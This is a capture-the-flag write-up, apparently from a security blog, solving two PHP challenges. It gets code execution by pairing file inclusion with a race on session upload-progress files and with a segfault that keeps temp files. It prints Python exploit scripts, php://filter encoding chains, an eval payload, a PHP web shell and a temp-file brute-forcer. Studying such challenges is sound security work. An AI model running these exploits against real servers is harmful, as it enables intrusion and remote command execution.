@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Hey, I am SpyD3r(@TarunkantG) and in this blog I will be discussing both challenge one line php and Return of one line php.Both challenges were very interesting and got to learn alot of new things, so">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Detailed writeup of both one line php and Return of one line php">
+<meta property="og:url" content="https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/index.html">
+<meta property="og:site_name" content="SpyClub">
+<meta property="og:description" content="Hey, I am SpyD3r(@TarunkantG) and in this blog I will be discussing both challenge one line php and Return of one line php.Both challenges were very interesting and got to learn alot of new things, so">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog2.1.png">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog2.2.png">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog2.3.png">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog2.4.png">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog2.5.png">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog2.6.png">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog2.7.png">
+<meta property="og:image" content="https://tarunkant.github.io/images/photos/blog2.8.png">
+<meta property="article:published_time" content="2018-12-20T18:30:00.000Z">
+<meta property="article:modified_time" content="2022-09-07T15:46:17.917Z">
+<meta property="article:author" content="SpyD3r">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="Race-Condition">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tarunkant.github.io/images/photos/blog2.1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Detailed writeup of both one line php and Return of one line php</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<!-- Responsive_1 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6813652886953741"
+     data-ad-slot="9518537929"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<script>
+      (adsbygoogle = window.adsbygoogle || []).push({
+           google_ad_client: "ca-pub-6813652886953741",
+           enable_page_level_ads: true
+      });
+</script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Blogs</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/SpyTools">Projects</a></li>
+         
+          <li><a href="/resume/resume.pdf">Resume</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/02/26/horizontal-privilege-escalation-on-quora/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/10/08/2018-10-08-inctf2018-web-challenge-writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&text=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&title=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&is_video=false&description=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Detailed writeup of both one line php and Return of one line php&body=Check out this article: https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&title=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&title=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&title=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&title=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&name=Detailed writeup of both one line php and Return of one line php&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Difference-between-these-two-challenge"><span class="toc-number">1.</span> <span class="toc-text">Difference between these two challenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#One-line-PHP"><span class="toc-number">2.</span> <span class="toc-text">One line PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1st-way-Orange-way"><span class="toc-number">2.1.</span> <span class="toc-text">1st way (Orange way):</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2nd-way"><span class="toc-number">2.2.</span> <span class="toc-text">2nd way:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-of-One-line-PHP"><span class="toc-number">3.</span> <span class="toc-text">Return of One line PHP</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Detailed writeup of both one line php and Return of one line php
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SpyClub</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-12-20T18:30:00.000Z" itemprop="datePublished">2018-12-21</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/blog/">blog</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/LFI/" rel="tag">LFI</a>, <a class="tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link-link" href="/tags/Race-Condition/" rel="tag">Race-Condition</a>, <a class="tag-link-link" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>Hey, I am SpyD3r(<a target="_blank" rel="noopener" href="https://twitter.com/TarunkantG">@TarunkantG</a>) and in this blog I will be discussing both challenge one line php and Return of one line php.<br>Both challenges were very interesting and got to learn alot of new things, so I decided to write a writeup on same, I have referred a lot of blogs to good catchup on these topic which I will be discussing in details.  </p>
+<h2 id="Difference-between-these-two-challenge"><a href="#Difference-between-these-two-challenge" class="headerlink" title="Difference between these two challenge"></a>Difference between these two challenge</h2><p>There was a small difference between these two challenge, in the one line php it was given default php with version 7.2 and in Return of one line php, it was given default php with one change <code>session.upload_progress.enabled = Off</code> and this change made old exploit not working or say for avoiding the old exploit and create a new one.  </p>
+<h2 id="One-line-PHP"><a href="#One-line-PHP" class="headerlink" title="One line PHP"></a>One line PHP</h2><p>This challenge was made by <a target="_blank" rel="noopener" href="https://twitter.com/orange_8361">@orange</a>, you can find his writeup <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge">here</a>.  </p>
+<p><img src="/images/photos/blog2.1.png" alt="a"><br>As you can see source code, from this we can know that we only can include things which starts from <code>@&lt;php</code> and they said that this is default php, so we can’t includes remote files because <code>allow_url_include = Off</code> in default. Now what??<br>The wrapper we can use is <code>php://filter</code>, and <code>session.upload_progress.enabled = On</code> so if this, we can control partial session file by making a post request by this parameter <code>PHP_SESSION_UPLOAD_PROGRESS</code>. And will include this session file with LFI.<br>Because <code>session.upload_progress.cleanup = On</code> by default, what it do is, it deletes the session file as soon as it’s work is done. We will bypass this using <code>Race Condition</code>.<br>We can change the session file name by sending the cookie <code>PHPSESSID=something</code>, by this the session file name will be <code>sess_something</code>.<br>So Now we know the session file name, but what the content look like?<br>So lets create a session file and check the content, here is the code snippet for creating session file.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=tarunkant&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:  final_payload</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    r = requests.post(HOST, files=&#123;<span class="string">&#x27;f&#x27;</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">    <span class="built_in">print</span> r.text</span><br><span class="line">    fp.close()</span><br></pre></td></tr></table></figure><br>It created the session file, lets look into it:<br><img src="/images/photos/blog2.2.png" alt="a"><br>As you can see our final_payload got prefix <code>upload_progress_</code>, but we wanted our file start from <code>@&lt;?php</code>, so we need to manipulate it. There are two ways to solve that challenge:  </p>
+<h3 id="1st-way-Orange-way"><a href="#1st-way-Orange-way" class="headerlink" title="1st way (Orange way):"></a>1st way (Orange way):</h3><p>Base64 encode your payload 3 times then add prefix <code>ZZ</code> or <code>BB</code> or <code>xx</code> and while including session file, base64 decode 3 times through php filter wrapper.<br>Why prefix <code>ZZ</code> or else??<br>Base64 decoding 3 times <code>upload_progress_ZZ</code> gives you empty string.  </p>
+<p><img src="/images/photos/blog2.3.png" alt="a"><br>So it will return your payload.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">final_payload = <span class="string">&#x27;ZZ&#x27;</span> + payload</span><br></pre></td></tr></table></figure><br>but this payload is 3 times base64-encoded of your payload. but remember every time you encode there should not be any <code>=</code> or <code>==</code>. There is code snippet for generating the same:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    junk = <span class="string">&#x27;&#x27;</span>.join(sample(string.ascii_letters, randint(<span class="number">8</span>, <span class="number">16</span>)))</span><br><span class="line">    x = b64encode(payload + junk)</span><br><span class="line">    xx = b64encode(b64encode(payload + junk))</span><br><span class="line">    xxx = b64encode(b64encode(b64encode(payload + junk)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> xx <span class="keyword">and</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> xxx:</span><br><span class="line">        payload=xxx</span><br><span class="line">        <span class="built_in">print</span> payload</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><br>Now is the time for RCE through Race Condition and LFI.<br>Now we need to make requests to include session file through LFI. there is code snippet for the same:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;/var/lib/php/sessions/sess_&#x27;</span> + sess_name</span><br><span class="line">filename = <span class="string">&#x27;php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s&#x27;</span> % filename</span><br><span class="line"><span class="built_in">print</span> filename</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    url = <span class="string">&#x27;%s?orange=%s&#x27;</span> % (HOST, filename)</span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    c = r.content</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">and</span> <span class="string">&#x27;orange&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> c:</span><br><span class="line">        <span class="built_in">print</span> [c]</span><br></pre></td></tr></table></figure><br>Run both code for creating the session file and including the session file at same time. Here is the full <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Automation/blob/master/RCE_through_include.py">exploit script</a>.  </p>
+<p>Key points to solve:</p>
+<ul>
+<li>Control session file by <code>PHP_SESSION_UPLOAD_PROGRESS</code>.</li>
+<li>Using PHP wrapper manipulate <code>upload_progress_</code>.</li>
+<li>Get RCE through Race COndition and LFI.</li>
+</ul>
+<h3 id="2nd-way"><a href="#2nd-way" class="headerlink" title="2nd way:"></a>2nd way:</h3><p>This way is somewhat different from orange way, you can get writeup <a target="_blank" rel="noopener" href="https://hackmd.io/s/B1A2JIjjm0">here</a>.<br>I will be using his POC here.<br>For decoding:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.IBM1154|convert.base64-encode|convert.iconv.UCS-2LE.UCS-2BE|string.rot13|convert.base64-decode|string.rot13|convert.base64-encode||convert.iconv.UCS-2LE.UCS-2BE|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UCS-4LE.UCS-4BE|convert.base64-decode|string.strip_tags|convert.iconv.CP1025.UTF8/resource=data://,upload_progress_</span><br></pre></td></tr></table></figure><br>For encoding:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode|convert.iconv.UCS-4LE.UCS-4BE|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|string.rot13|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-decode|string.rot13|convert.base64-encode|string.rot13|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-decode|convert.iconv.IBM1154.UTF8/resource=data://,xyz</span><br></pre></td></tr></table></figure><br>In this way we will encode our payload and using <code>PHP_SESSION_UPLOAD_PROGRESS</code> we will send it to server, this will make session file and using LFI we will decode through php filter wrapper.<br>So we need to encode our payload, but what will be??<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;&gt;&quot;</span> . iconv(<span class="string">&#x27;UTF8&#x27;</span>,<span class="string">&#x27;CP1025&#x27;</span>,<span class="string">&#x27;@&lt;?php eval($_GET[1]);?&gt;//aaa&#x27;</span>);</span><br></pre></td></tr></table></figure><br>Why do we need to pad with <code>&gt;</code> ??<br>Because<br><img src="/images/photos/blog2.4.png" alt="a"><br>Here you can see that after decoding <code>upload_progress_</code> it starts with <code>&lt;</code>, so we will close this and will do <code>string.strip_tags</code>, so that it will replace <code>upload_progress_</code> with empty string.<br>Why CP1025 encoding??<br>At last after <code>string.strip_tags</code> did his work, now decoding algo has <code>convert.iconv.CP1025.UTF8</code> for decoding that.<br>So finally we got our shell payload.  </p>
+<p><img src="/images/photos/blog2.5.png" alt="a"><br><img src="/images/photos/blog2.6.png" alt="a"><br>Now we have to make POST request to<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orange=php://filter/convert.iconv.UTF8.IBM1154|convert.base64-encode|convert.iconv.UCS-2LE.UCS-2BE|string.rot13|convert.base64-decode|string.rot13|convert.base64-encode||convert.iconv.UCS-2LE.UCS-2BE|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UCS-4LE.UCS-4BE|convert.base64-decode|string.strip_tags|convert.iconv.CP1025.UTF8/resource=/var/lib/php/sessions/sess_tarunkant&amp;1=?&gt;&lt;?php system(ls);</span><br></pre></td></tr></table></figure><br>with data <code>PHP_SESSION_UPLOAD_PROGRESS</code> consisting our encoded payload.</p>
+<h2 id="Return-of-One-line-PHP"><a href="#Return-of-One-line-PHP" class="headerlink" title="Return of One line PHP"></a>Return of One line PHP</h2><p>As I said earlier here in this challenge <code>session.upload_progress.enabled = Off</code>. Now what ??<br>There was one bug submitted a year ago, which was segmentation fault in php7.0 which can lead RCE (If we get LFI ;) ). you can get writeup <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfd049924258">here</a>.<br>POC<br><img src="/images/photos/blog2.7.png" alt="a"><br>This challenge is similar to this bug, but the php version given here was 7.2.<br>So need to find segmentation fault in 7.2, So here is the POC<br><img src="/images/photos/blog2.8.png" alt="a"><br>Here is the writeup how it got derived, <a target="_blank" rel="noopener" href="https://hackmd.io/s/rJlfZva0m">here</a>.<br>Now what after getting segmentation fault, How will you get RCE through LFI using same ??<br>So everyone know that, when we upload a file, server make a temp file having same content as uploaded file and after some time it gets deleted, so what if php gets hang in between? cool, then our file won’t get delete. Then we can make request to that temp file using LFI to get RCE. How will you do that now?  </p>
+<p>In while loop Make post request to<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure><br>And send shell file<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;spyd3r&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  url = base_url + <span class="string">&quot;/trial.php?file=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line">  files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">  response = requests.post(url, files=files)</span><br></pre></td></tr></table></figure>
+<p>Now we need to bruteforce for the temp file, Here is the full code.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">charset1 = string.digits + string.letters</span><br><span class="line">charset2 = charset[::-<span class="number">1</span>]</span><br><span class="line">charset3 = string.letters + string.digits</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce</span>(<span class="params">prefix,charset</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">                filename = prefix + i + j + k</span><br><span class="line">                url = <span class="string">&quot;%s/Trash/trial15.php?file=/tmp/php%s&quot;</span> % (base_url, filename)</span><br><span class="line">                <span class="built_in">print</span> url</span><br><span class="line">                response = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;spyd3r&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">        threading.Thread(target=bruteforce,args=(<span class="string">&#x27;00&#x27;</span>+<span class="built_in">str</span>(i),charset1,)).start()</span><br><span class="line">        threading.Thread(target=bruteforce,args=(<span class="string">&#x27;00&#x27;</span>+<span class="built_in">str</span>(i),charset2,)).start()</span><br><span class="line">        threading.Thread(target=bruteforce,args=(<span class="string">&#x27;00&#x27;</span>+<span class="built_in">str</span>(i),charset3,)).start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><br>Both challenge was very interesting, really enjoyed…<br>I hope you guys found it good article and worth to read.<br>Thanks,</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Blogs</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/SpyTools">Projects</a></li>
+         
+          <li><a href="/resume/resume.pdf">Resume</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Difference-between-these-two-challenge"><span class="toc-number">1.</span> <span class="toc-text">Difference between these two challenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#One-line-PHP"><span class="toc-number">2.</span> <span class="toc-text">One line PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1st-way-Orange-way"><span class="toc-number">2.1.</span> <span class="toc-text">1st way (Orange way):</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2nd-way"><span class="toc-number">2.2.</span> <span class="toc-text">2nd way:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-of-One-line-PHP"><span class="toc-number">3.</span> <span class="toc-text">Return of One line PHP</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&text=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&title=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&is_video=false&description=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Detailed writeup of both one line php and Return of one line php&body=Check out this article: https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&title=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
